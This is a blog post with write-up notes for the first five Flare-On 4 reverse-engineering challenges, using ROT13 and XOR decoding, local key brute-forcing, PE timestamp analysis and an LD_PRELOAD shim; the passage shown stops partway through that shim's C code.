<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="FlareOn 4 WriteUps" prefix="og: http://ogp.me/ns#" property=og:title><meta content="FlareOn 4 WriteUps - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2017-10-13-flareon-4-writeups property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/flareon-2017-header.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="FlareOn 4 WriteUps - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2017-10-13-flareon-4-writeups name=twitter:url><meta content=https://blahcat.github.io/img/flareon-2017-header.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2017-10-13-flareon-4-writeups",
      
      "image": https://blahcat.github.io/img/flareon-2017-header.png",
      
      
      "description": FlareOn 4 WriteUps - by hugsy",
      
    }
    </script><title>
  FlareOn 4 WriteUps
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/flareon-2017-header.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>FlareOn 4 WriteUps</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 13 October 2017 <br> <br> <i>Reading time: 45 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><p>This year, I happened to finally have a chance to be in a good position to play <a rel="noopener nofollow noreferrer" href=https://flare-on.com target=_blank>Flare-On CTF</a>, a yearly CTF published by <a rel="noopener nofollow noreferrer" href=https://web.archive.org/web/20170831191227/https://www.fireeye.com/blog/threat-research/2017/08/fourth-annual-flare-on-challenge.html target=_blank>FireEye</a>. This year’s edition offered 12 reverse-engineering challenges to solve in 6 weeks.<p>This post is mostly a dump of the notes taken during all the challenges. Link to challenges and scripts are also given.<h1 id=menu>Menu</h1><p>For quick jump:<p>| <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-1>Level1</a> | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-2>Level2</a> | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-3>Level3</a> | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-4>Level4</a> | | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-5>Level5</a> | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-6>Level6</a> | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-7>Level7</a> | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-8>Level8</a> | | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-9>Level9</a> | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-10>Level10</a> | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-11>Level11</a> | <a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#challenge-12>Level12</a> |<p>All the challenges are in the ZIP file that you can <a rel="noopener nofollow noreferrer" href=https://mega.nz/#F!lVQzXZZQ!bZkK8Q2XkLb0O-RE-hCl1g target=_blank>download here</a>.<h1 id=the-arsenal>The Arsenal</h1><p>My complete arsenal was (in no particular order):<ul><li><a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/modern.ie-vagrant target=_blank>Modern-IE Windows VM</a><li><a rel="noopener nofollow noreferrer" href=https://www.hex-rays.com target=_blank>IDA Pro</a> <ul><li><a rel="noopener nofollow noreferrer" href=https://github.com/nihilus/IDA_Signsrch target=_blank>IDA SignSrch</a></ul><li><a rel="noopener nofollow noreferrer" href=https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger target=_blank>WinDBG</a><li><a rel="noopener nofollow noreferrer" href=http://www.ntcore.com/exsuite.php target=_blank>CFF Explorer</a><li><a rel="noopener nofollow noreferrer" href=https://mh-nexus.de/en/hxd target=_blank>HxD</a><li><a rel="noopener nofollow noreferrer" href=https://www.aldeid.com/wiki/PEiD target=_blank>PEiD</a><li><a rel="noopener nofollow noreferrer" href=http://www.rohitab.com/apimonitor target=_blank>AIP Monitor</a><li><a rel="noopener nofollow noreferrer" href=https://docs.microsoft.com/en-us/sysinternals target=_blank>SysInternals Suite</a><li><a rel="noopener nofollow noreferrer" href=https://binary.ninja target=_blank>Binary Ninja</a> <ul><li><a rel="noopener nofollow noreferrer" href=https://github.com/fluxchief/binaryninja_avr target=_blank>Binja-AVR</a><li><a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/12ffb0aaacbf87db3247ad1a07acb13c target=_blank>Binja-covfefe</a></ul><li>GDB + <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/gef target=_blank>GEF</a><li><a rel="noopener nofollow noreferrer" href=https://github.com/buserror/simavr target=_blank>SimAVR</a><li><a rel="noopener nofollow noreferrer" href=https://docs.oracle.com/javase/8/docs/technotes/tools/unix/jdb.html target=_blank>JDB</a><li><a rel="noopener nofollow noreferrer" href=https://github.com/skylot/jadx target=_blank>JADX</a><li><a rel="noopener nofollow noreferrer" href=https://www.genymotion.com target=_blank>GenyMotion</a><li>Python modules: <ul><li><a rel="noopener nofollow noreferrer" href=https://pypi.python.org/pypi/IntelHex target=_blank>Python-IntelHex</a><li><a rel="noopener nofollow noreferrer" href=https://pypi.python.org/pypi/pycrypto target=_blank>PyCrypto</a><li><a rel="noopener nofollow noreferrer" href=https://pypi.python.org/pypi/python-camellia/0.1.1 target=_blank>Python-Camellia</a><li><a rel="noopener nofollow noreferrer" href=https://pypi.python.org/pypi/python-lzo/1.11 target=_blank>Python-LZO</a><li><a rel="noopener nofollow noreferrer" href=https://github.com/secretsquirrel/the-backdoor-factory/blob/master/aPLib/contrib/python/aplib.py target=_blank>Python-ApLib</a></ul><li><a rel="noopener nofollow noreferrer" href=https://github.com/0xd4d/dnSpy target=_blank>DnSpy</a><li><a rel="noopener nofollow noreferrer" href=https://github.com/crypto2011/IDR target=_blank>Interactive Delphi Reconstructor</a><li><a rel="noopener nofollow noreferrer" href=https://wireshark.org target=_blank>Wireshark</a><li><a rel="noopener nofollow noreferrer" href=https://github.com/joxeankoret/diaphora target=_blank>Diaphora</a><li><a rel="noopener nofollow noreferrer" href=http://www.semicomplete.com/projects/xdotool target=_blank>xdotool</a></ul><p>And a lot of C and Python snippets…<h1 id=challenge-1>Challenge 1</h1><h1 id=instruction>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>Welcome to the Fourth Flare-On Challenge! The key format, as always, will be a
</span><span>valid email address in the @flare-on.com domain.
</span></code></pre><h1 id=solution>Solution</h1><p>By checking the <a rel="noopener nofollow noreferrer" href=https://mega.nz/#!1EQhhLrT!uWOWRRGc-8Lx2D0iLxkSk3qMSK-xcWBV8Pnj8CYTaRg target=_blank>HTML source code</a>, we see:</p><a href=/img/flareon-2017/17161f3635f37c0b278c18262e4a29eb4f21675316ff9a086557e390ca3be67e.png target=_blank> <img alt=image_alt src=/img/flareon-2017/17161f3635f37c0b278c18262e4a29eb4f21675316ff9a086557e390ca3be67e.png title=image_alt width=100%> </a><p>Classic ROT-13, can be decoded by:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> "</span><span style=color:#a3be8c>PyvragFvqrYbtvafNerRnfl@syner-ba.pbz</span><span>".</span><span style=color:#bf616a>decode</span><span>("</span><span style=color:#a3be8c>rot13</span><span>")
</span><span>ClientSideLoginsAreEasy@flare-on.com
</span></code></pre><p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-2>Challenge 2</h1><h1 id=instruction-1>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>You solved that last one really quickly! Have you ever tried to reverse engineer
</span><span>a compiled x86 binary? Let's see if you are still as quick.
</span></code></pre><h1 id=solution-1>Solution</h1><p><a rel="noopener nofollow noreferrer" href=https://mega.nz/#!gBIF0aYQ!82SWKCVa3hw2sI3f_2AsaHaoVwj2zux5ORXXfNMi2F4 target=_blank><code>IgniteMe.exe</code></a> is a small PE that reads what a buffer from stdin and chain-xor it in reverse (with an IV set to <code>4</code> by function at 0x00401000) and then compared to an <code>encoded_key</code> located at 0x0403000:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>00403000  0d 26 49 45 2a 17 78 44-2b 6c 5d 5e 45 12 2f 17  .&IE*.xD+l]^E./.
</span><span>00403010  2b 44 6f 6e 56 09 5f 45-47 73 26 0a 0d 13 17 48  +DonV._EGs&....H
</span><span>00403020  42 01 40 4d 0c 02 69 00                          B.@M..i.
</span></code></pre><p>It’s a classic simple XOR encoding challenge, the script <a rel="noopener nofollow noreferrer" href=https://gist.github.com/f84ad968d233699bfe47b81d7b7e73dc target=_blank>IgniteMe.py</a> was used to decode it :<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> py IgniteMe.py
</span><span style=color:#bf616a>[...]
</span><span style=color:#bf616a>result</span><span> R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com
</span></code></pre><p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-3>Challenge 3</h1><h1 id=instruction-2>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>Now that we see you have some skill in reverse engineering computer software,
</span><span>the FLARE team has decided that you should be tested to determine the extent of
</span><span>your abilities. You will most likely not finish, but take pride in the few
</span><span>points you may manage to earn yourself along the way.
</span></code></pre><h1 id=solution-2>Solution</h1><p><a rel="noopener nofollow noreferrer" href=https://mega.nz/#!4cpGWS5S!QCTrpXnC8q4WYnMHaxbqFA4mPDOVC4q2toAYGKSfe68 target=_blank><code>greek_to_me</code></a> is a PE file that will start by binding and listen tcp/2222, and receive 4 bytes from the socket. This value read will be used to decode the instructions at 0x40107c to 0x4010ee:</p><a href=/img/flareon-2017/489d77b797f222ef52533b5da295fd7e733c9156ec43cbd44aa1f8163ece1f81.png target=_blank> <img alt=image_alt1 src=/img/flareon-2017/489d77b797f222ef52533b5da295fd7e733c9156ec43cbd44aa1f8163ece1f81.png title=image_alt1 width=100%> </a><p>Being lazy, I’ve reconstructed <a rel="noopener nofollow noreferrer" href=https://gist.github.com/7c7ee0e9cd9399a5ec975a72cfe58486 target=_blank>this C script</a> from IDA decompiler which allowed me to perform simply a brute-force locally:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> make greek_to_me
</span><span style=color:#bf616a>$</span><span> ./greek_to_me
</span><span style=color:#bf616a>Starting</span><span> new process 31673 with range(0, 0x20000000)
</span><span style=color:#bf616a>[...]
</span><span style=color:#bf616a>Found</span><span> valid key: 536871074
</span><span style=color:#bf616a>Found</span><span> valid key: 1610612898
</span><span style=color:#bf616a>Found</span><span> valid key: 1073741986
</span></code></pre><p>With those keys, we can re-run the binary by sending those value (properly encoded) to the socket on tcp/2222:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>import </span><span>socket, sys, struct
</span><span>valid_keys = [</span><span style=color:#d08770>162</span><span>, </span><span style=color:#d08770>536871074</span><span>, </span><span style=color:#d08770>1610612898</span><span>, </span><span style=color:#d08770>1073741986</span><span>]
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>p32</span><span>(</span><span style=color:#bf616a>x</span><span>): </span><span style=color:#b48ead>return </span><span>struct.</span><span style=color:#bf616a>pack</span><span>("</span><span style=color:#a3be8c>I</span><span>", x)
</span><span>s = socket.</span><span style=color:#bf616a>socket</span><span>()
</span><span>s.</span><span style=color:#bf616a>connect</span><span>(("</span><span style=color:#a3be8c>127.0.0.1</span><span>", </span><span style=color:#d08770>2222</span><span>))
</span><span>s.</span><span style=color:#bf616a>send</span><span>(</span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#bf616a>int</span><span>(sys.argv[</span><span style=color:#d08770>1</span><span>])))
</span><span style=color:#b48ead>print </span><span>s.</span><span style=color:#bf616a>recv</span><span>(</span><span style=color:#d08770>0x100</span><span>)
</span></code></pre><p>which will show as a response:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>Congratulations! But wait, where's my flag?
</span></code></pre><p>But by setting WinDBG to break at 0x040107c and by passing the correct decoding key when prompted, a whole new code shows up:</p><a href=/img/flareon-2017/05d0733685c70aa9802ace1c97c240ace73a3c18c941219d975775cae32d10a5.png target=_blank> <img alt=image_alt src=/img/flareon-2017/05d0733685c70aa9802ace1c97c240ace73a3c18c941219d975775cae32d10a5.png title=image_alt width=100%> </a><p>Revealing the key to this level.<p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-4>Challenge 4</h1><h1 id=instruction-3>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>You're using a VM to run these right?
</span></code></pre><h1 id=solution-3>Solution</h1><p>This challenge was very fun at the beginning, but the last part really sucked: <a rel="noopener nofollow noreferrer" href=https://mega.nz/#!IZA3nbLK!qdpuFX29rpXHBfEdXRWMq5R-gHw-5QHiN9cAMhx2vsk target=_blank><code>notepad.exe</code></a> is a small PE that by all appearance spawns Windows classic <code>notepad</code>. I was fooled for a bit at first by the instruction to this challenge, I expected a malware or something hostile, but it is nothing of the sort. Disassembling the <code>start</code> in IDA shows a bunch of interesting strings:</p><a href=/img/flareon-2017/c2be22c2350ecf3a792cfa07a72ee0c6a55e129e60642577e70994e53c3e2efd.png target=_blank> <img alt=image_alt src=/img/flareon-2017/c2be22c2350ecf3a792cfa07a72ee0c6a55e129e60642577e70994e53c3e2efd.png title=image_alt width=100%> </a><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>%USERPROFILE%\flareon2016challenge
</span><span>ImageHlp.dll
</span><span>CheckSumMappedFile
</span><span>User32.dll
</span><span>MessageBoxA
</span></code></pre><p>So I created the folder <code>flareon2016challenge</code> and spawned <code>procmon</code>:</p><a href=/img/flareon-2017/9e3fc6079d951d311ad3bacdee5d98d5d191b63663d7803e93ec1f260cbde521.png target=_blank> <img alt=image_alt src=/img/flareon-2017/9e3fc6079d951d311ad3bacdee5d98d5d191b63663d7803e93ec1f260cbde521.png title=image_alt width=100%> </a><p>clearly showing that <code>notepad</code> is looking for something in this directory. Breaking on <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa364418(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank><code>Kernel32!FindFirstFile</code></a> we discover that the loop at 0x10140B0 performs a <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa365200(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank>classic file lookup in directory</a>, and calling the function at 0x1014E20 when a file is found. That’s where stuff gets interesting.<p>![image_alt]/img/flareon-2017/d9d6b730545915c4d7a94f05ff7b42ab7b5ba9fa5a9bc119147d6a35dd357c18.png)<p><code>notepad</code> maps the file in memory, checks if it started with <code>MZ</code>, gets the value at offset 0x3c, then jump to the offset and checks if the <code>mmap</code>-ed memory at this offset is equal to <code>PE</code>. It looks like it is searching for one or more valid PE executable files in the <code>flareon2016challenge</code> folder. It does a few extra checks (is it Intel machine in PE header, etc.) and if everything passes, calls 0x010146C0.<p>This function will take the timestamps from the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680313(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank>PE header</a> of the current program (<code>notepad.exe</code>) and the PE file mapped to memory. If those 2 values are the ones expected, then 2 functions are called successively:<ol><li>Function @ 0x1014350 which will format the timestamp of the mapped file and <code>MessageBox</code>-it <a href=/img/flareon-2017/3321b96da80e52cd9e26eda05122bb1bd58a18216d6aeb1b4205162d2ed6dbf6.png target=_blank> <img alt=image_alt src=/img/flareon-2017/3321b96da80e52cd9e26eda05122bb1bd58a18216d6aeb1b4205162d2ed6dbf6.png title=image_alt width=100%> </a><li>Function @ 0x1014BAC which will open a file <code>key.bin</code> in <code>flareon2016challenge</code> folder and write 8 bytes from some offset in the mapped file into it.</ol><p>Or in horrible pseudo-code:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>encoded_buffer = [</span><span style=color:#d08770>0x37</span><span>, </span><span style=color:#d08770>0xe7</span><span>, </span><span style=color:#d08770>0xd8</span><span>, </span><span style=color:#d08770>0xbe</span><span>, etc..]  </span><span style=color:#65737e># populated at 010148F3
</span><span>
</span><span style=color:#b48ead>if </span><span>notepad.pe.timestamp == '</span><span style=color:#a3be8c>2008-04-13 11:35:51</span><span>' and mmap.pe.timestamp == '</span><span style=color:#a3be8c>2016-09-08 11:49:06</span><span>':
</span><span>   </span><span style=color:#bf616a>MessageBox</span><span>('</span><span style=color:#a3be8c>2016-09-08 11:49:06</span><span>')
</span><span>   </span><span style=color:#bf616a>Write_8_Bytes_From</span><span>(</span><span style=color:#bf616a>src</span><span>=mmap, </span><span style=color:#bf616a>dst</span><span>=`key.bin`)
</span><span>
</span><span style=color:#b48ead>elif </span><span>notepad.pe.timestamp == '</span><span style=color:#a3be8c>2016-09-08 11:49:06</span><span>' and mmap.pe.timestamp == '</span><span style=color:#a3be8c>2016-09-09 05:54:16</span><span>':
</span><span>   </span><span style=color:#bf616a>MessageBox</span><span>('</span><span style=color:#a3be8c>2016-09-09 05:54:16</span><span>')
</span><span>   </span><span style=color:#bf616a>Write_8_Bytes_From</span><span>(</span><span style=color:#bf616a>src</span><span>=mmap, </span><span style=color:#bf616a>dst</span><span>=`key.bin`)
</span><span>
</span><span style=color:#b48ead>elif </span><span>notepad.pe.timestamp == '</span><span style=color:#a3be8c>2016-09-09 05:54:16</span><span>' and mmap.pe.timestamp == '</span><span style=color:#a3be8c>2008-11-10 01:40:34</span><span>':
</span><span>   </span><span style=color:#bf616a>MessageBox</span><span>('</span><span style=color:#a3be8c>2008-11-10 01:40:34</span><span>')
</span><span>   </span><span style=color:#bf616a>Write_8_Bytes_From</span><span>(</span><span style=color:#bf616a>src</span><span>=mmap, </span><span style=color:#bf616a>dst</span><span>=`key.bin`)
</span><span>
</span><span style=color:#b48ead>elif </span><span>notepad.pe.timestamp == '</span><span style=color:#a3be8c>2008-11-10 01:40:34</span><span>' and mmap.pe.timestamp == '</span><span style=color:#a3be8c>2016-07-31 17:00:00</span><span>':
</span><span>   </span><span style=color:#bf616a>MessageBox</span><span>('</span><span style=color:#a3be8c>2016-07-31 17:00:00</span><span>')
</span><span>   </span><span style=color:#bf616a>Write_8_Bytes_From</span><span>(</span><span style=color:#bf616a>src</span><span>=mmap, </span><span style=color:#bf616a>dst</span><span>=`key.bin`)
</span><span>
</span><span style=color:#b48ead>elif </span><span>notepad.pe.timestamp == '</span><span style=color:#a3be8c>2016-07-31 17:00:00</span><span>':
</span><span>   key = </span><span style=color:#bf616a>ReadFileContent</span><span>('</span><span style=color:#a3be8c>key.bin</span><span>')
</span><span>   </span><span style=color:#b48ead>assert </span><span style=color:#96b5b4>len</span><span>(key) == </span><span style=color:#d08770>0x20
</span><span>   decoded_key = </span><span style=color:#bf616a>DecodeWithKey</span><span>( encoded_buffer, key )
</span><span>   </span><span style=color:#bf616a>MessageBox</span><span>(decoded_key)
</span></code></pre><p>So now we know how the decoding key is built, but we don’t know which PE to use. This guessing game made me lose too much time. The hint was to use 2016 PE files from last year’s FlareOn challenge.<p>In the many folders of the FlareOn3 Zip archive, we could find several PE files whose timestamps match perfectly with the ones we are looking for. All we need now is drop those files in the <code>flareon2016challenge</code> directory, and tweak <code>notepad.exe</code> to update its timestamp. After 4 executions we get the <code>key.bin</code> file properly filled:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>➜</span><span>  xd </span><span style=color:#bf616a>~</span><span>/ctf/flareon_2017/4/key.bin
</span><span style=color:#bf616a>00000000</span><span>  55 8b ec 8b 4d 0c 56 57  8b 55 08 52 ff 15 30 20  |</span><span style=color:#bf616a>U...M.VW.U.R..0 </span><span>|
</span><span style=color:#bf616a>00000010</span><span>  c0 40 50 ff d6 83 c4 08  00 83 c4 08 5d c3 cc cc  |</span><span style=color:#bf616a>.@P.........]...</span><span>|
</span><span style=color:#bf616a>00000020
</span></code></pre><p>And after updating <code>notepad</code> to the last PE timestamp, we get:</p><a href=/img/flareon-2017/fe5e80d5dd81c1350413732f30ed5ba2b2e4ae1cf92b00504fa6a0bba1b9a820.png target=_blank> <img alt=image_alt src=/img/flareon-2017/fe5e80d5dd81c1350413732f30ed5ba2b2e4ae1cf92b00504fa6a0bba1b9a820.png title=image_alt width=100%> </a><p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-5>Challenge 5</h1><h1 id=instruction-4>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>You're doing great. Let's take a break from all these hard challenges and play a little game.
</span></code></pre><h1 id=solution-4>Solution</h1><p><a rel="noopener nofollow noreferrer" href=https://mega.nz/#!pdgDDITS!CCXq80gh7M2YxOosfdd_jKXG2N9uUSG_1_5NLY_rbFg target=_blank><code>pewpewboat.exe</code></a> is not a PE file but an x64 ELF that starts a nice ASCII implementation of <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/Battleship_(game) target=_blank>the Battleship game</a>.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>root@kali2:/ctf/flareon_2017/5 </span><span style=color:#65737e># ./pewpewboat.exe
</span><span style=color:#bf616a>Loading</span><span> first pew pew map...
</span><span>   </span><span style=color:#bf616a>1</span><span> 2 3 4 5 6 7 8
</span><span>  </span><span style=color:#bf616a>_________________
</span><span style=color:#bf616a>A </span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|
</span><span style=color:#bf616a>B </span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|
</span><span style=color:#bf616a>C </span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|
</span><span style=color:#bf616a>D </span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|
</span><span style=color:#bf616a>E </span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|
</span><span style=color:#bf616a>F </span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|
</span><span style=color:#bf616a>G </span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|
</span><span style=color:#bf616a>H </span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|
</span><span>
</span><span style=color:#bf616a>Rank:</span><span> Seaman Recruit
</span><span>
</span><span style=color:#bf616a>Welcome</span><span> to pewpewboat! We just loaded a pew pew map, start shootin'</span><span style=color:#a3be8c>!
</span><span style=color:#a3be8c>
</span><span style=color:#a3be8c>Enter a coordinate:
</span></code></pre><p>The binary starts by initializing the PRNG with the current timestamp, then allocated a 0x240 in the heap, and starts populating it randomly. It then enters a loop of game, where the player (us) have 0x64 attempts to win the game.</p><a href=/img/flareon-2017/c1042765b377b68599461aa2c7fbabeb502f831a49db09cb5bb6223a22c99bce.png target=_blank> <img alt=image_alt src=/img/flareon-2017/c1042765b377b68599461aa2c7fbabeb502f831a49db09cb5bb6223a22c99bce.png title=image_alt width=100%> </a><p>Inside the loop, the function <code>play()</code> (at 0x4038d6) is called and will print the game grid and display whether your shot was hit or miss. The coordinates themselves are read from the function <code>enter_coor()</code> (at 0x40377d).</p><a href=/img/flareon-2017/aea95f918e61631fae4e6fe1d003951d1fc30d7fcf0e8ac787b14983e264c876.png target=_blank> <img alt=image_alt src=/img/flareon-2017/aea95f918e61631fae4e6fe1d003951d1fc30d7fcf0e8ac787b14983e264c876.png title=image_alt width=100%> </a><p>So if we want to win, we need to<ol><li>disable the randomness of the game board<li>determine which values are being compared when we set coordinates</ol><p>To disable the randomness, I simply used <code>LD_PRELOAD</code> variable against a homemade shared library that will override calls to <code>rand()</code> and <code>rand()</code> to a deterministic output:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#65737e>// Compile with : $ gcc -shared -fPIC disable_time.c -o disable_time.so
</span><span>
</span><span style=color:#65737e>// Load in GDB with: gef➤  set environment LD_PRELOAD=disable_time.so
</span><span>
</span><span style=color:#b48ead>#include </span><span><</span><span style=color:#a3be8c>time.h</span><span>>
</span><span>
</span><span style=color:#b48ead>#include </span><span><</span><span style=color:#a3be8c>stdlib.h</span><span>>
</span><span>
